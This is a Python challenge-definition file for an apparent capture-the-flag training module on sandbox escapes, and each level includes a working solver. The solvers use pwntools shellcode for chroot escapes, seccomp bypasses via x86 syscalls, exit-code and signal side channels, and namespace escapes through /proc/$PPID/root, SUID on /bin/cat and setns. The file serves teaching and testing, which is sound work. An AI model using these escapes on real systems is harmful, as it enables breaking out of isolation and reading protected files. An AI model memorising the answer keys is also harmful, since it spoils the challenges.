import pwnshop
import signal
import pwn
import os

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge


class BabyJailBase(Challenge):
    TEMPLATE_PATH = "babyjail/babyjail.c"
    PIE = False
    LINK_LIBRARIES = ["capstone", "seccomp"]

    chroot_path = "/tmp/jail-XXXXXX"
    fake_flag = "FLAG{FAKE}"
    chroot = True
    chdir = True
    open_file = True
    allow_flag_path = False
    send_file = False
    shellcode = True
    syscalls_allowed = []
    seccomp_default_kill = True
    seccomp_add_arch_x86 = False


dot_dot_flag = "../../../../../flag"


class BabyJailChrootEscape(BabyJailBase):
    """
    Escape a basic chroot sandbox!
    """
    LINK_LIBRARIES = []

    chdir = False
    open_file = False
    allow_flag_path = True
    send_file = True
    shellcode = False

    def verify(self, **kwargs):
        """
        basic chroot escape, read out single file
        """
        with self.run_challenge(**kwargs, cmd_args=[dot_dot_flag]) as process:
            assert self.flag in process.readall()


class BabyJailChrootNoFlagText(BabyJailBase):
    """
    Escape a basic chroot sandbox by utilizing shellcode.
    """
    LINK_LIBRARIES = ["capstone"]

    chdir = False

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(pwn.shellcraft.readfile(dot_dot_flag, 1))
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootChdir(BabyJailBase):
    """
    Escape a chroot sandbox with shellcode.
    """
    LINK_LIBRARIES = ["capstone"]

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode, chdir to /
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.openat(3, "flag", 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootOpenatOnly(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]
    """
    syscalls_allowed = ["openat", "read", "write", "sendfile"]

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode, chdir to /, restrict syscalls to ["openat", "read", "write", "sendfile"]
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.openat(3, "flag", 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootLinkatOnly(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["linkat", "open", "read", "write", "sendfile"]
    """
    syscalls_allowed = ["linkat", "open", "read", "write", "sendfile"]

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode, chdir to /, restrict syscalls to ["linkat", "open", "read", "write", "sendfile"]
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            # TODO: bug in pwntools breaks pwn.shellcraft.linkat
            shellcode = pwn.asm(
                pwn.shellcraft.open("/", 0)
                + pwn.shellcraft.pushstr("flag")
                + pwn.shellcraft.mov("rbx", "rsp")
                + pwn.shellcraft.pushstr("real_flag")
                + pwn.shellcraft.mov("rcx", "rsp")
                + pwn.shellcraft.syscall(265, 3, "rbx", 4, "rcx", 0)
                + pwn.shellcraft.open("real_flag", 0)
                + pwn.shellcraft.sendfile(1, 5, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailCHrootFchdirOnly(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["fchdir", "open", "read", "write", "sendfile"]
    """
    syscalls_allowed = ["fchdir", "open", "read", "write", "sendfile"]

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode, chdir to /, restrict syscalls to ["fchdir", "open", "read", "write", "sendfile"]
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.fchdir(3)
                + pwn.shellcraft.open(dot_dot_flag, 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootMakeNewJail(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["chdir", "chroot", "mkdir", "open", "read", "write", "sendfile"]
    """
    syscalls_allowed = ["chdir", "chroot", "mkdir", "open", "read", "write", "sendfile"]

    def verify(self, **kwargs):
        """
        chroot escape, read out single file that does not contain "flag", allow shellcode, chdir to /, restrict syscalls to ["chdir", "chroot", "mkdir", "open", "read", "write", "sendfile"]
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.mkdir("/new_jail")
                + pwn.shellcraft.chroot("/new_jail")
                + pwn.shellcraft.open(dot_dot_flag, 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootLeakFD(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]
    """
    open_file = False
    syscalls_allowed = ["openat", "read", "write", "sendfile"]

    def verify(self, **kwargs):
        """
        chroot escape, allow shellcode, chdir to /, restrict syscalls to ["openat", "read", "write", "sendfile"], leak a file descriptor into the process
        """
        def preexec_fn():
            os.dup2(os.open("/", 0), 3)

        with self.run_challenge(
            **kwargs, preexec_fn=preexec_fn, close_fds=False
        ) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.openat(3, "flag", 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailChrootx86Syscalls(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["close", "stat", "fstat", "lstat"]
    """
    chroot = False
    open_file = False
    syscalls_allowed = ["close", "stat", "fstat", "lstat"]
    seccomp_default_kill = False
    seccomp_add_arch_x86 = True

    def verify(self, **kwargs):
        """
        Allow shellcode, restrict syscalls to ["close", "stat", "fstat", "lstat"], allow x86
        """
        with self.run_challenge(**kwargs) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.mov("eax", 5)  # SYS_open
                + pwn.shellcraft.mov("ebx", 0x1337100)
                + pwn.shellcraft.mov("ecx", 0)
                + pwn.shellcraft.mov("edx", 0)
                + "int 0x80;"
                + pwn.shellcraft.mov("ebx", "eax")
                + pwn.shellcraft.mov("eax", 3)  # SYS_read
                + pwn.shellcraft.mov("ecx", 0x1337100)
                + pwn.shellcraft.mov("edx", 128)
                + "int 0x80;"
                + pwn.shellcraft.mov("eax", 4)  # SYS_write
                + pwn.shellcraft.mov("ebx", 1)
                + "int 0x80;"
            )
            shellcode = shellcode.ljust(0x100, b"\x90")
            shellcode += b"/flag\x00"
            process.write(shellcode)
            assert self.flag in process.readall()


class BabyJailExitCodeSideChannel(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read", "exit"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
    """
    chroot = False
    allow_flag_path = True
    syscalls_allowed = ["read", "exit"]

    def verify(self, **kwargs):
        """
        Allow shellcode, read out single file, restrict syscalls to ["read", "exit"]
        """
        flag = []
        for i in range(128):
            with self.run_challenge(**kwargs, cmd_args=["/flag"]) as process:
                shellcode = pwn.asm(
                    pwn.shellcraft.read(3, "rsp", i)
                    + pwn.shellcraft.push(0)
                    + pwn.shellcraft.read(3, "rsp", 1)
                    + "mov rdi, [rsp];"
                    + pwn.shellcraft.exit("rdi")
                )
                process.write(shellcode)
                if result := process.poll(True):
                    flag.append(result)
                else:
                    break
        assert bytes(flag) == self.flag


def solve_sidechannel(verify, **kwargs):
    flag = []
    for i in range(128):
        byte = 0
        for bit in range(8):
            while True:
                with verify(**kwargs, cmd_args=["/flag"]) as process:
                    shellcode = pwn.asm(f"""
                    {pwn.shellcraft.read(3, "rsp", i)}
                    {pwn.shellcraft.push(0)}
                    {pwn.shellcraft.read(3, "rsp", 1)}
                    mov al, [rsp]
                    and al, {1 << bit}
                    test al, al
                    jz crash
                    int3
                    crash: int 1
                    """)
                    try:
                        process.write(shellcode)
                    except EOFError:
                        try:
                            process.proc.stdin.close()
                        except BrokenPipeError:
                            pass
                        process.proc.stdin.close()
                        continue
                    if process.poll(True) == -signal.SIGTRAP:
                        byte |= 1 << bit
                    break
        if byte:
            flag.append(byte)
        else:
            break
    return bytes(flag)


class BabyJailNanosleepSideChannel(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read", "nanosleep"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
    """
    chroot = False
    allow_flag_path = True
    syscalls_allowed = ["read", "nanosleep"]

    def verify(self, **kwargs):
        """
        Allow shellcode, read out single file, restrict syscalls to ["read", "nanosleep"]
        """
        assert solve_sidechannel(self.run_challenge, **kwargs) == self.flag


class BabyJailReadSideChannel(BabyJailBase):
    """
    Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
    """
    chroot = False
    allow_flag_path = True
    syscalls_allowed = ["read"]

    def verify(self, **kwargs):
        """
        Allow shellcode, read out single file, restrict syscalls to ["read"]
        """
        assert solve_sidechannel(self.run_challenge, **kwargs) == self.flag


shellcode_fork_sandbox = pwn.asm(
    """
mov rax, 1
mov rdi, 4
lea rsi, [rip+flagcmd]
mov rdx, 128
syscall
mov rax, 0
mov rdi, 4
lea rsi, [rip+printcmd]
add rsi, 10
mov rdx, 128
syscall
mov rax, 1
mov rdi, 4
lea rsi, [rip+printcmd]
mov rdx, 128
syscall
mov rax, 60
syscall
flagcmd:
    .string "read_file:/flag"
printcmd:
    .string "print_msg:"
"""
)


class BabyJailForkSandbox(BabyJailBase):
    """
    Escape a different kind of sandbox in which a jailed child process is only communicable to from a parent process.
    """
    TEMPLATE_PATH = "babyjail/babyjail_fork_sandbox.c"
    LINK_LIBRARIES = ["seccomp"]

    syscalls_allowed = ["read", "write", "exit"]

    def verify(self, **kwargs):
        """
        Fork, parent reads in shellcode to send to child, restrict syscalls to ["read", "write", "exit"]
        """
        with self.run_challenge(**kwargs) as process:
            process.write(shellcode_fork_sandbox)
            assert self.flag in process.readall()

class BabyJailNSNoUnmountOld(BabyJailBase):
    """
    Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?
    """
    LINK_LIBRARIES = []

    shellcode = False
    mounted_dirs = [ "bin", "usr", "lib", "lib64" ]
    mounted_dirs_ro = False
    chroot = False
    nsroot = True
    open_file = False
    shell = True
    close_fds = True
    require_vm = True
    unmount_old_root = False

    def verify(self, **kwargs):
        """
        Just cat the old flag.
        """
        with self.run_challenge(**kwargs) as process:
            process.sendline("/bin/cat /old/flag; exit")
            assert self.flag in process.readall()

class BabyJailNSReadWrite(BabyJailBase):
    """
    Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what are the implications of sharing filesystems between the sandbox and host?
    """
    LINK_LIBRARIES = []

    shellcode = False
    mounted_dirs = [ "bin", "usr", "lib", "lib64" ]
    mounted_dirs_ro = False
    chroot = False
    nsroot = True
    open_file = False
    shell = True
    close_fds = True
    require_vm = True
    unmount_old_root = True

    def verify(self, **kwargs):
        """
        Just set SUID bit on the (writable) /bin/cat.
        """
        with self.run_challenge(**kwargs) as process:
            process.sendline("/bin/cat /old/flag; exit")
            assert self.flag not in process.readall()

        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.sendline("/bin/chmod 4755 /bin/cat && echo YAY")
            process.readuntil("YAY")
            assert oct(os.stat("/bin/cat").st_mode)[-4] == '4'
            assert self.flag in pwn.process("cat /flag".split()).clean()
            process.sendline("/bin/chmod 755 /bin/cat && echo FIX")
            process.readuntil("FIX")
            assert oct(os.stat("/bin/cat").st_mode)[-4] != '4'
            process.sendline("exit")

class BabyJailNSMountProc(BabyJailBase):
    """
    Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what shenanigans can you get up to with special kernel-backed filesystems?
    """
    LINK_LIBRARIES = []

    shellcode = False
    mounted_dirs = [ "bin", "usr", "lib", "lib64", "proc" ]
    mounted_dirs_ro = True
    chroot = False
    nsroot = True
    open_file = False
    shell = True
    close_fds = True
    require_vm = True
    unmount_old_root = True

    def verify(self, **kwargs):
        """
        Use access to /proc/pid/root of the parent.
        """
        with self.run_challenge(**kwargs) as process:
            process.sendline("/bin/cat /old/flag; exit")
            assert self.flag not in process.readall()

        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.sendline("/bin/cat /proc/$PPID/root/flag")
            process.sendline("exit")
            assert self.flag in process.readall()

        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.sendline("/bin/chmod 4755 /bin/cat && echo YAY")
            process.sendline("exit")
            assert b"YAY" not in process.readall()
            assert oct(os.stat("/bin/cat").st_mode)[-4] != '4'

class BabyJailNSSmuggleFD(BabyJailBase):
    """
    Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what happens if you can smuggle in a resource from the outside?
    """
    LINK_LIBRARIES = ["capstone"]

    shellcode = True
    mounted_dirs = [ ]
    mounted_dirs_ro = True
    chroot = False
    nsroot = True
    open_file = True
    close_fds = True
    require_vm = True
    unmount_old_root = True

    def verify(self, **kwargs):
        """
        Just use openat.
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            shellcode = pwn.asm(pwn.shellcraft.readfile("/old/flag", 1))
            process.send(shellcode)
            assert self.flag not in process.readall()

        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            process.clean()
            shellcode = pwn.asm(
                pwn.shellcraft.openat(3, "flag", 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()

class BabyJailNSScratchDir(BabyJailBase):
    """
    Learn the implications of a different way of sandboxing, using modern namespacing techniques! What could be the harm of mounting in a harmless directory?
    """
    LINK_LIBRARIES = ["capstone"]

    shellcode = True
    mounted_dirs = [ ]
    mounted_dirs_ro = True
    chroot = False
    nsroot = True
    open_file = False
    scratch_dir = True
    close_fds = True
    require_vm = True
    unmount_old_root = True

    def verify(self, **kwargs):
        """
        Mount in /proc/pid/ns and setns().
        """
        with self.run_challenge(**kwargs, cmd_args=["/"]) as process:
            assert self.flag not in process.readall()
            assert process.returncode == -6

        with self.run_challenge(**kwargs, cmd_args=[f"/proc/{os.getpid()}/ns"]) as process:
            shellcode = pwn.asm(pwn.shellcraft.readfile("/old/flag", 1))
            process.send(shellcode)
            assert self.flag not in process.readall()

        with self.run_challenge(**kwargs, cmd_args=[f"/proc/{os.getpid()}/ns"]) as process:
            process.clean()
            shellcode = pwn.asm(
                pwn.shellcraft.open("/data/mnt", 0)
                + pwn.shellcraft.setns(3, 0x20000)
                + pwn.shellcraft.open("/flag", 0)
                + pwn.shellcraft.sendfile(1, 4, 0, 128)
            )
            process.write(shellcode)
            assert self.flag in process.readall()

LEVELS = [
    BabyJailChrootEscape,
    BabyJailChrootNoFlagText,
    BabyJailChrootChdir,
    BabyJailChrootOpenatOnly,
    BabyJailChrootLinkatOnly,
    BabyJailCHrootFchdirOnly,
    BabyJailChrootMakeNewJail,
    BabyJailChrootLeakFD,
    BabyJailChrootx86Syscalls,
    BabyJailExitCodeSideChannel,
    BabyJailNanosleepSideChannel,
    BabyJailReadSideChannel,
    BabyJailForkSandbox,
    BabyJailNSNoUnmountOld,
    BabyJailNSReadWrite,
    BabyJailNSMountProc,
    BabyJailNSSmuggleFD,
    BabyJailNSScratchDir,
]
NUM_TESTING=0
DOJO_MODULE="sandbox"
pwnshop.register_challenges(LEVELS)
